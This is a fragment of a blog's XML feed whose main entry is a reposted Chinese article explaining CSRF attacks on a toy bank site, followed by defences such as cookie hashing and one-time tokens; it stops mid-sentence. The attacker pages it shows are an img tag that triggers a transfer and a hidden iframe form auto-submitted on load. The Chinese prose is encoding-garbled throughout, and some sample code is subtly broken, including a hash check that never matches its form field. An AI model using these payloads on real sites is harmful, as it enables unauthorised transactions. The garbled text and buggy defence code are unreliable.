¡éªŒï¼š</p><ol><li>MD5ï¼š<code>md5 filename</code></li><li>SHA1: <code>shasum filename</code></li><li>CRC32: <code>crc32 filename</code></li></ol><p>CentOSå¹³å°ä¸‹åˆ™æ˜¯ï¼š</p><ol><li>MD5: <code>md5sum filename</code></li><li>SHA1: <code>shasum filename</code></li></ol><p>æ˜¯ä¸æ˜¯æ–¹ä¾¿äº†å¾ˆå¤šå‘¢ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è½¬ã€‘æµ…è°ˆCSRFæ”»å‡»æ–¹å¼</title>
      <link href="/post/csrf-attack/"/>
      <url>/post/csrf-attack/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡æ›´æ–°äº†ï¼Œhexoå‘½ä»¤éƒ½è¦å¿˜è®°äº†ã€‚ã€‚ã€‚</p><a id="more"></a><h3 id="ä¸€-CSRFæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ä¸€-CSRFæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ä¸€.CSRFæ˜¯ä»€ä¹ˆï¼Ÿ"></a>ä¸€.CSRFæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>ã€€ã€€CSRFï¼ˆCross-site request forgeryï¼‰ï¼Œä¸­æ–‡åç§°ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸ºï¼šone click attack/session ridingï¼Œç¼©å†™ä¸ºï¼šCSRF/XSRFã€‚</p><h3 id="äºŒ-CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ"><a href="#äºŒ-CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ" class="headerlink" title="äºŒ.CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ"></a>äºŒ.CSRFå¯ä»¥åšä»€ä¹ˆï¼Ÿ</h3><p>ã€€ã€€ä½ è¿™å¯ä»¥è¿™ä¹ˆç†è§£CSRFæ”»å‡»ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚CSRFèƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ä½ åä¹‰å‘é€é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œç”šè‡³äºè´­ä¹°å•†å“ï¼Œè™šæ‹Ÿè´§å¸è½¬è´¦â€¦â€¦é€ æˆçš„é—®é¢˜åŒ…æ‹¬ï¼šä¸ªäººéšç§æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚</p><h3 id="ä¸‰-CSRFæ¼æ´ç°çŠ¶"><a href="#ä¸‰-CSRFæ¼æ´ç°çŠ¶" class="headerlink" title="ä¸‰.CSRFæ¼æ´ç°çŠ¶"></a>ä¸‰.CSRFæ¼æ´ç°çŠ¶</h3><p>ã€€ã€€CSRFè¿™ç§æ”»å‡»æ–¹å¼åœ¨2000å¹´å·²ç»è¢«å›½å¤–çš„å®‰å…¨äººå‘˜æå‡ºï¼Œä½†åœ¨å›½å†…ï¼Œç›´åˆ°06å¹´æ‰å¼€å§‹è¢«å…³æ³¨ï¼Œ08å¹´ï¼Œå›½å†…å¤–çš„å¤šä¸ªå¤§å‹ç¤¾åŒºå’Œäº¤äº’ç½‘ç«™åˆ†åˆ«çˆ†å‡ºCSRFæ¼æ´ï¼Œå¦‚ï¼šNYTimes.comï¼ˆçº½çº¦æ—¶æŠ¥ï¼‰ã€Metafilterï¼ˆä¸€ä¸ªå¤§å‹çš„BLOGç½‘ç«™ï¼‰ï¼ŒYouTubeå’Œç™¾åº¦HIâ€¦â€¦è€Œç°åœ¨ï¼Œäº’è”ç½‘ä¸Šçš„è®¸å¤šç«™ç‚¹ä»å¯¹æ­¤æ¯«æ— é˜²å¤‡ï¼Œä»¥è‡³äºå®‰å…¨ä¸šç•Œç§°CSRFä¸ºâ€œæ²‰ç¡çš„å·¨äººâ€ã€‚</p><h3 id="å››-CSRFçš„åŸç†"><a href="#å››-CSRFçš„åŸç†" class="headerlink" title="å››.CSRFçš„åŸç†"></a>å››.CSRFçš„åŸç†</h3><p>ã€€ã€€ä¸‹å›¾ç®€å•é˜è¿°äº†CSRFæ”»å‡»çš„æ€æƒ³ï¼š</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r58tdovj30t80gh44a.jpg" alt="CSRFæ”»å‡»"></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œè¦å®Œæˆä¸€æ¬¡CSRFæ”»å‡»ï¼Œå—å®³è€…å¿…é¡»ä¾æ¬¡å®Œæˆä¸¤ä¸ªæ­¥éª¤ï¼š</p><p>ã€€ã€€1. ç™»å½•å—ä¿¡ä»»ç½‘ç«™Aï¼Œå¹¶åœ¨æœ¬åœ°ç”ŸæˆCookieã€‚</p><p>ã€€ã€€2. åœ¨ä¸ç™»å‡ºAçš„æƒ…å†µä¸‹ï¼Œè®¿é—®å±é™©ç½‘ç«™Bã€‚</p><p>ã€€ã€€çœ‹åˆ°è¿™é‡Œï¼Œä½ ä¹Ÿè®¸ä¼šè¯´ï¼šâ€œå¦‚æœæˆ‘ä¸æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶ä¸­çš„ä¸€ä¸ªï¼Œæˆ‘å°±ä¸ä¼šå—åˆ°CSRFçš„æ”»å‡»â€ã€‚æ˜¯çš„ï¼Œç¡®å®å¦‚æ­¤ï¼Œä½†ä½ ä¸èƒ½ä¿è¯ä»¥ä¸‹æƒ…å†µä¸ä¼šå‘ç”Ÿï¼š</p><p>ã€€ã€€1. ä½ ä¸èƒ½ä¿è¯ä½ ç™»å½•äº†ä¸€ä¸ªç½‘ç«™åï¼Œä¸å†æ‰“å¼€ä¸€ä¸ªtabé¡µé¢å¹¶è®¿é—®å¦å¤–çš„ç½‘ç«™ã€‚</p><p>ã€€ã€€2. ä½ ä¸èƒ½ä¿è¯ä½ å…³é—­æµè§ˆå™¨äº†åï¼Œä½ æœ¬åœ°çš„Cookieç«‹åˆ»è¿‡æœŸï¼Œä½ ä¸Šæ¬¡çš„ä¼šè¯å·²ç»ç»“æŸã€‚ï¼ˆäº‹å®ä¸Šï¼Œå…³é—­æµè§ˆå™¨ä¸èƒ½ç»“æŸä¸€ä¸ªä¼šè¯ï¼Œä½†å¤§å¤šæ•°äººéƒ½ä¼šé”™è¯¯çš„è®¤ä¸ºå…³é—­æµè§ˆå™¨å°±ç­‰äºé€€å‡ºç™»å½•/ç»“æŸä¼šè¯äº†â€¦â€¦ï¼‰</p><p>ã€€ã€€3. ä¸Šå›¾ä¸­æ‰€è°“çš„æ”»å‡»ç½‘ç«™ï¼Œå¯èƒ½æ˜¯ä¸€ä¸ªå­˜åœ¨å…¶ä»–æ¼æ´çš„å¯ä¿¡ä»»çš„ç»å¸¸è¢«äººè®¿é—®çš„ç½‘ç«™ã€‚</p><p>ã€€ã€€ä¸Šé¢å¤§æ¦‚åœ°è®²äº†ä¸€ä¸‹CSRFæ”»å‡»çš„æ€æƒ³ï¼Œä¸‹é¢æˆ‘å°†ç”¨å‡ ä¸ªä¾‹å­è¯¦ç»†è¯´è¯´å…·ä½“çš„CSRFæ”»å‡»ï¼Œè¿™é‡Œæˆ‘ä»¥ä¸€ä¸ªé“¶è¡Œè½¬è´¦çš„æ“ä½œä½œä¸ºä¾‹å­ï¼ˆä»…ä»…æ˜¯ä¾‹å­ï¼ŒçœŸå®çš„é“¶è¡Œç½‘ç«™æ²¡è¿™ä¹ˆå‚»:&gt;ï¼‰</p><p>ã€€ã€€ç¤ºä¾‹1ï¼š</p><p>ã€€ã€€é“¶è¡Œç½‘ç«™Aï¼Œå®ƒä»¥GETè¯·æ±‚æ¥å®Œæˆé“¶è¡Œè½¬è´¦çš„æ“ä½œï¼Œå¦‚ï¼š<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000" target="_blank" rel="noopener">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p><p>ã€€ã€€å±é™©ç½‘ç«™Bï¼Œå®ƒé‡Œé¢æœ‰ä¸€æ®µHTMLçš„ä»£ç å¦‚ä¸‹ï¼š</p><p>  <code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</code></p><p>  é¦–å…ˆï¼Œä½ ç™»å½•äº†é“¶è¡Œç½‘ç«™Aï¼Œç„¶åè®¿é—®å±é™©ç½‘ç«™Bï¼Œå™¢ï¼Œè¿™æ—¶ä½ ä¼šå‘ç°ä½ çš„é“¶è¡Œè´¦æˆ·å°‘äº†1000å—â€¦â€¦</p><p>ã€€ã€€ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼ŸåŸå› æ˜¯é“¶è¡Œç½‘ç«™Aè¿åäº†HTTPè§„èŒƒï¼Œä½¿ç”¨GETè¯·æ±‚æ›´æ–°èµ„æºã€‚åœ¨è®¿é—®å±é™©ç½‘ç«™Bçš„ä¹‹å‰ï¼Œä½ å·²ç»ç™»å½•äº†é“¶è¡Œç½‘ç«™Aï¼Œè€ŒBä¸­çš„<img>ä»¥GETçš„æ–¹å¼è¯·æ±‚ç¬¬ä¸‰æ–¹èµ„æºï¼ˆè¿™é‡Œçš„ç¬¬ä¸‰æ–¹å°±æ˜¯æŒ‡é“¶è¡Œç½‘ç«™äº†ï¼ŒåŸæœ¬è¿™æ˜¯ä¸€ä¸ªåˆæ³•çš„è¯·æ±‚ï¼Œä½†è¿™é‡Œè¢«ä¸æ³•åˆ†å­åˆ©ç”¨äº†ï¼‰ï¼Œæ‰€ä»¥ä½ çš„æµè§ˆå™¨ä¼šå¸¦ä¸Šä½ çš„é“¶è¡Œç½‘ç«™Açš„Cookieå‘å‡ºGetè¯·æ±‚ï¼Œå»è·å–èµ„æºâ€œ<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000â€ï¼Œç»“æœé“¶è¡Œç½‘ç«™æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæ›´æ–°èµ„æºæ“ä½œï¼ˆè½¬è´¦æ“ä½œï¼‰ï¼Œæ‰€ä»¥å°±ç«‹åˆ»è¿›è¡Œè½¬è´¦æ“ä½œ" target="_blank" rel="noopener">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000â€ï¼Œç»“æœé“¶è¡Œç½‘ç«™æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªæ›´æ–°èµ„æºæ“ä½œï¼ˆè½¬è´¦æ“ä½œï¼‰ï¼Œæ‰€ä»¥å°±ç«‹åˆ»è¿›è¡Œè½¬è´¦æ“ä½œ</a>â€¦â€¦</p><p>ã€€ã€€ç¤ºä¾‹2ï¼š</p><p>ã€€ã€€ä¸ºäº†æœç»ä¸Šé¢çš„é—®é¢˜ï¼Œé“¶è¡Œå†³å®šæ”¹ç”¨POSTè¯·æ±‚å®Œæˆè½¬è´¦æ“ä½œã€‚</p><p>ã€€ã€€é“¶è¡Œç½‘ç«™Açš„WEBè¡¨å•å¦‚ä¸‹ï¼šã€€ã€€</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Transfer.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">ã€€   <span class="tag">&lt;<span class="name">p</span>&gt;</span>ToBankId: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">ã€€   <span class="tag">&lt;<span class="name">p</span>&gt;</span>Money: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"money"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">ã€€   <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Transfer"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   åå°å¤„ç†é¡µé¢Transfer.phpå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'toBankId'</span>] &amp;&amp;ã€€<span class="keyword">isset</span>($_REQUEST[<span class="string">'money'</span>])) &#123;</span><br><span class="line">    buy_stocks($_REQUEST[<span class="string">'toBankId'</span>],ã€€$_REQUEST[<span class="string">'money'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  å±é™©ç½‘ç«™Bï¼Œä»ç„¶åªæ˜¯åŒ…å«é‚£å¥HTMLä»£ç ï¼š</p><p><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</code></p><p>å’Œç¤ºä¾‹1ä¸­çš„æ“ä½œä¸€æ ·ï¼Œä½ é¦–å…ˆç™»å½•äº†é“¶è¡Œç½‘ç«™Aï¼Œç„¶åè®¿é—®å±é™©ç½‘ç«™Bï¼Œç»“æœâ€¦..å’Œç¤ºä¾‹1ä¸€æ ·ï¼Œä½ å†æ¬¡æ²¡äº†1000å—ï½T_Tï¼Œè¿™æ¬¡äº‹æ•…çš„åŸå› æ˜¯ï¼šé“¶è¡Œåå°ä½¿ç”¨äº†$_REQUESTå»è·å–è¯·æ±‚ çš„æ•°æ®ï¼Œè€Œ$_REQUESTæ—¢å¯ä»¥è·å–GETè¯·æ±‚çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥è·å–POSTè¯·æ±‚çš„æ•°æ®ï¼Œè¿™å°±é€ æˆäº†åœ¨åå°å¤„ç†ç¨‹åºæ— æ³•åŒºåˆ†è¿™åˆ°åº•æ˜¯GETè¯·æ±‚çš„æ•°æ®è¿˜æ˜¯POSTè¯·æ±‚çš„æ•°æ®ã€‚åœ¨PHPä¸­ï¼Œå¯ä»¥ä½¿ç”¨$_GETå’Œ$_POSTåˆ†åˆ«è·å–GETè¯·æ±‚å’ŒPOSTè¯·æ±‚çš„æ•°æ®ã€‚åœ¨JAVAä¸­ï¼Œç”¨äºè·å–è¯·æ±‚æ•°æ®requestä¸€æ ·å­˜åœ¨ä¸èƒ½åŒºåˆ†GETè¯·æ±‚æ•°æ®å’ŒPOSTæ•°æ®çš„é—®é¢˜ã€‚</p><p>ã€€ã€€ç¤ºä¾‹3ï¼š</p><p>ã€€ã€€ç»è¿‡å‰é¢2ä¸ªæƒ¨ç—›çš„æ•™è®­ï¼Œé“¶è¡Œå†³å®šæŠŠè·å–è¯·æ±‚æ•°æ®çš„æ–¹æ³•ä¹Ÿæ”¹äº†ï¼Œæ”¹ç”¨$_POSTï¼Œåªè·å–POSTè¯·æ±‚çš„æ•°æ®ï¼Œåå°å¤„ç†é¡µé¢Transfer.phpä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'toBankId'</span>] &amp;&amp;ã€€<span class="keyword">isset</span>($_POST[<span class="string">'money'</span>])) &#123;</span><br><span class="line">    buy_stocks($_POST[<span class="string">'toBankId'</span>],ã€€$_POST[<span class="string">'money'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   ç„¶è€Œï¼Œå±é™©ç½‘ç«™Bä¸æ—¶ä¿±è¿›ï¼Œå®ƒæ”¹äº†ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">ã€€ã€€ã€€ã€€ã€€ã€€<span class="function"><span class="keyword">function</span> <span class="title">steal</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">     ã€€ã€€ã€€ã€€ iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span></span><br><span class="line"><span class="actionscript">ã€€ã€€     ã€€ã€€ iframe.document.Submit(<span class="string">"transfer"</span>);</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€&#125;</span><br><span class="line">ã€€ã€€ã€€ã€€<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ã€€ã€€<span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"steal()"</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span>ã€€<span class="attr">action</span>=<span class="string">"http://www.myBank.com/Transfer.php"</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"1000"</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç”¨æˆ·ä»æ˜¯ç»§ç»­ä¸Šé¢çš„æ“ä½œï¼Œå¾ˆä¸å¹¸ï¼Œç»“æœå°†ä¼šæ˜¯å†æ¬¡ä¸è§1000å—â€¦â€¦å› ä¸ºè¿™é‡Œå±é™©ç½‘ç«™Bæš—åœ°é‡Œå‘é€äº†POSTè¯·æ±‚åˆ°é“¶è¡Œ!</p><p>ã€€ã€€æ€»ç»“ä¸€ä¸‹ä¸Šé¢3ä¸ªä¾‹å­ï¼ŒCSRFä¸»è¦çš„æ”»å‡»æ¨¡å¼åŸºæœ¬ä¸Šæ˜¯ä»¥ä¸Šçš„3ç§ï¼Œå…¶ä¸­ä»¥ç¬¬1,2ç§æœ€ä¸ºä¸¥é‡ï¼Œå› ä¸ºè§¦å‘æ¡ä»¶å¾ˆç®€å•ï¼Œä¸€ä¸ª<img>å°±å¯ä»¥äº†ï¼Œè€Œç¬¬3ç§æ¯”è¾ƒéº»çƒ¦ï¼Œéœ€è¦ä½¿ç”¨JavaScriptï¼Œæ‰€ä»¥ä½¿ç”¨çš„æœºä¼šä¼šæ¯”å‰é¢çš„å°‘å¾ˆå¤šï¼Œä½†æ— è®ºæ˜¯å“ªç§æƒ…å†µï¼Œåªè¦è§¦å‘äº†CSRFæ”»å‡»ï¼Œåæœéƒ½æœ‰å¯èƒ½å¾ˆä¸¥é‡ã€‚</p><p>ã€€ã€€ç†è§£ä¸Šé¢çš„3ç§æ”»å‡»æ¨¡å¼ï¼Œå…¶å®å¯ä»¥çœ‹å‡ºï¼ŒCSRFæ”»å‡»æ˜¯æºäºWEBçš„éšå¼èº«ä»½éªŒè¯æœºåˆ¶ï¼WEBçš„èº«ä»½éªŒè¯æœºåˆ¶è™½ç„¶å¯ä»¥ä¿è¯ä¸€ä¸ªè¯·æ±‚æ˜¯æ¥è‡ªäºæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œä½†å´æ— æ³•ä¿è¯è¯¥è¯·æ±‚æ˜¯ç”¨æˆ·æ‰¹å‡†å‘é€çš„ï¼</p><h3 id="äº”-CSRFçš„é˜²å¾¡"><a href="#äº”-CSRFçš„é˜²å¾¡" class="headerlink" title="äº”.CSRFçš„é˜²å¾¡"></a>äº”.CSRFçš„é˜²å¾¡</h3><p>ã€€ã€€æˆ‘æ€»ç»“äº†ä¸€ä¸‹çœ‹åˆ°çš„èµ„æ–™ï¼ŒCSRFçš„é˜²å¾¡å¯ä»¥ä»æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¸¤æ–¹é¢ç€æ‰‹ï¼Œé˜²å¾¡æ•ˆæœæ˜¯ä»æœåŠ¡ç«¯ç€æ‰‹æ•ˆæœæ¯”è¾ƒå¥½ï¼Œç°åœ¨ä¸€èˆ¬çš„CSRFé˜²å¾¡ä¹Ÿéƒ½åœ¨æœåŠ¡ç«¯è¿›è¡Œã€‚</p><p>ã€€ã€€1. æœåŠ¡ç«¯è¿›è¡ŒCSRFé˜²å¾¡</p><p>ã€€ã€€æœåŠ¡ç«¯çš„CSRFæ–¹å¼æ–¹æ³•å¾ˆå¤šæ ·ï¼Œä½†æ€»çš„æ€æƒ³éƒ½æ˜¯ä¸€è‡´çš„ï¼Œå°±æ˜¯åœ¨å®¢æˆ·ç«¯é¡µé¢å¢åŠ ä¼ªéšæœºæ•°ã€‚</p><p>ã€€ã€€(1).Cookie Hashing(æ‰€æœ‰è¡¨å•éƒ½åŒ…å«åŒä¸€ä¸ªä¼ªéšæœºå€¼)ï¼š</p><p>ã€€ã€€è¿™å¯èƒ½æ˜¯æœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆäº†ï¼Œå› ä¸ºæ”»å‡»è€…ä¸èƒ½è·å¾—ç¬¬ä¸‰æ–¹çš„Cookie(ç†è®ºä¸Š)ï¼Œæ‰€ä»¥è¡¨å•ä¸­çš„æ•°æ®ä¹Ÿå°±æ„é€ å¤±è´¥äº†:&gt;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//æ„é€ åŠ å¯†çš„Cookieä¿¡æ¯</span></span><br><span class="line">$value = â€œDefenseSCRFâ€;</span><br><span class="line">setcookie(â€cookieâ€, $value, time()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><p>åœ¨è¡¨å•é‡Œå¢åŠ Hashå€¼ï¼Œä»¥è®¤è¯è¿™ç¡®å®æ˜¯ç”¨æˆ·å‘é€çš„è¯·æ±‚ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>ã€€$hash = md5($_COOKIE[<span class="string">'cookie'</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">â€POSTâ€</span> <span class="attr">action</span>=<span class="string">â€transfer.phpâ€</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€textâ€</span> <span class="attr">name</span>=<span class="string">â€toBankIdâ€</span>&gt;</span></span><br><span class="line">ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€textâ€</span> <span class="attr">name</span>=<span class="string">â€moneyâ€</span>&gt;</span></span><br><span class="line">ã€€ã€€&lt;input type=â€hiddenâ€ name=â€hashâ€ value=â€&lt;?=$hash;?&gt;â€&gt;</span><br><span class="line">ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€submitâ€</span> <span class="attr">name</span>=<span class="string">â€submitâ€</span> <span class="attr">value</span>=<span class="string">â€Submitâ€</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨æœåŠ¡å™¨ç«¯è¿›è¡ŒHashå€¼éªŒè¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'check'</span>])) &#123;</span><br><span class="line">     $hash = md5($_COOKIE[<span class="string">'cookie'</span>]);</span><br><span class="line">     <span class="keyword">if</span>($_POST[<span class="string">'check'</span>] == $hash) &#123;</span><br><span class="line">          doJob();</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€ã€€<span class="comment">//...</span></span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ã€€ã€€ã€€<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•ä¸ªäººè§‰å¾—å·²ç»å¯ä»¥æœç»99%çš„CSRFæ”»å‡»äº†ï¼Œé‚£è¿˜æœ‰1%å‘¢â€¦.ç”±äºç”¨æˆ·çš„Cookieå¾ˆå®¹æ˜“ç”±äºç½‘ç«™çš„XSSæ¼æ´è€Œè¢«ç›—å–ï¼Œè¿™å°±å¦å¤–çš„1%ã€‚ä¸€èˆ¬çš„æ”»å‡»è€…çœ‹åˆ°æœ‰éœ€è¦ç®—Hashå€¼ï¼ŒåŸºæœ¬éƒ½ä¼šæ”¾å¼ƒäº†ï¼ŒæŸäº›é™¤å¤–ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦100%çš„æœç»ï¼Œè¿™ä¸ªä¸æ˜¯æœ€å¥½çš„æ–¹æ³•ã€‚<br>ã€€ã€€(2).éªŒè¯ç </p><p>ã€€ã€€è¿™ä¸ªæ–¹æ¡ˆçš„æ€è·¯æ˜¯ï¼šæ¯æ¬¡çš„ç”¨æˆ·æäº¤éƒ½éœ€è¦ç”¨æˆ·åœ¨è¡¨å•ä¸­å¡«å†™ä¸€ä¸ªå›¾ç‰‡ä¸Šçš„éšæœºå­—ç¬¦ä¸²ï¼Œå„â€¦.è¿™ä¸ªæ–¹æ¡ˆå¯ä»¥å®Œå…¨è§£å†³CSRFï¼Œä½†ä¸ªäººè§‰å¾—åœ¨æ˜“ç”¨æ€§æ–¹é¢ä¼¼ä¹ä¸æ˜¯å¤ªå¥½ï¼Œè¿˜æœ‰å¬é—»æ˜¯éªŒè¯ç å›¾ç‰‡çš„ä½¿ç”¨æ¶‰åŠäº†ä¸€ä¸ªè¢«ç§°ä¸ºMHTMLçš„Bugï¼Œå¯èƒ½åœ¨æŸäº›ç‰ˆæœ¬çš„å¾®è½¯IEä¸­å—å½±å“ã€‚</p><p>ã€€ã€€(3).One-Time Tokens(ä¸åŒçš„è¡¨å•åŒ…å«ä¸€ä¸ªä¸åŒçš„ä¼ªéšæœºå€¼)</p><p>ã€€ã€€åœ¨å®ç°One-Time 